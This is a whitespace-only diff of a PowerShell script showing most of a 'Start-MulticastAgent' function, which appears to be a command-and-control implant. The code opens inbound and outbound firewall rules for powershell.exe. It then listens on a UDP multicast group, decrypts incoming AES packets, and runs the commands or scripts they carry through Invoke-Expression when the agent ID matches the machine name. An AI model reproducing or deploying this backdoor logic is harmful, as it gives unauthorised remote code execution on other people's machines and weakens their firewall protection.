@@ -52,7 +52,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 
 
 function Start-MulticastAgent {
-   
+
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $false)]
@@ -66,7 +66,7 @@ function Start-MulticastAgent {
         [Parameter(Mandatory = $false)]
         [Int]
         $BindPort = 51112,
-      
+
         [Parameter(Mandatory = $false)]
         [String]
         $AgentID = "$env:computername",
@@ -78,7 +78,7 @@ function Start-MulticastAgent {
 
         New-NetFirewallRule -Program "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Action Allow -Profile Domain, Private -DisplayName "PowerShell" -Description "PowerShell" -Direction Inbound
         New-NetFirewallRule -Program "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Action Allow -Profile Domain, Private -DisplayName "PowerShell" -Description "PowerShell" -Direction Outbound
-    
+
         #netsh advfirewall firewall add rule name="PowerShell" dir=in action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
         #netsh advfirewall firewall add rule name="PowerShell" dir=out action=allow program="c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe" enable=yes
 
@@ -96,7 +96,7 @@ function Start-MulticastAgent {
         $multicast_group = [IPAddress]::Parse($MultiCastGroup)
         $udp_client.JoinMulticastGroup($multicast_group, 50)
         $receivebytes = $udp_client.Receive([ref]$LocalEndPoint)
-        
+
 
         If ($receivebytes) {
             $receive_data = ([text.encoding]::ASCII).GetString($receivebytes)
@@ -105,9 +105,9 @@ function Start-MulticastAgent {
             $decrypted_data = Decrypt-String $AESKey $receive_data
             # Parse Packet for ID
             $ReceiveID = $decrypted_data.Split(";")[0]
-			
+
 			$Command = $decrypted_data.Split(";")[1]
-			
+
 			$Script = $decrypted_data.Split(";")[2]
             if ($ReceiveID -eq $AgentID) {
 				if ($command) {
@@ -117,9 +117,9 @@ function Start-MulticastAgent {
 				}
 				elseif ($script) {
 					Write-Output "Executing Script"
-					
+
 					$results = (Invoke-Expression -Command $Script -ErrorAction stop 2>&1 |Out-String)
-					
+
 				}
 				elseif ($Command -eq "ExitAgent") {
 					exit
@@ -143,11 +143,11 @@ function Start-MulticastAgent {
 					Finally {
 						$udp_client.Close()
 						$results = $null
-						
+
 
 					}
-				
+
 				}
-			} 
-    }    
+			}
+    }
 }
